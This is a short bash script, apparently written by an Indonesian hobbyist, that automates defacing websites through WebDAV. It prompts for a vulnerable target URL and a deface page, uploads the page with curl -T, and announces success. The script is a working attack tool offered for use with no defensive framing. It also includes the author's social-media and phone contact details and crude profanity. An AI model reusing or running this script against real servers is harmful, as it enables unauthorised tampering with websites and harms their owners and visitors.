#Code by Adelwin
#yg recode saya doakan nggak makmur hidup nya!!!

while [ kontol ]
do
clear
toilet -f mono12 -F border Webdav | lolcat
echo " ######################################

[+] project   : DEFACE WEBDAV
[+] Author    : Mr.Adelwin
[+] Youtube   : Adelwin1234
[+] Ig        : adelwin_nugroho
[+] No Wa     : 085747876131

###################################### " | lolcat
echo "\33[0;32m Targetnya: " 
  python target.py

read -p " masukan web vuln nya ==> " target;
read -p " masukkan SC deface nya ==> " SC;
curl -T /storage/emulated/0/$SC $target
 clear
figlet -f standard sucsees | lolcat
echo "[!] sukses boss!!! " | lolcat
echo "[!] silahkan di cek : "$target/$SC | lolcat
sleep 13
echo $kontol
done
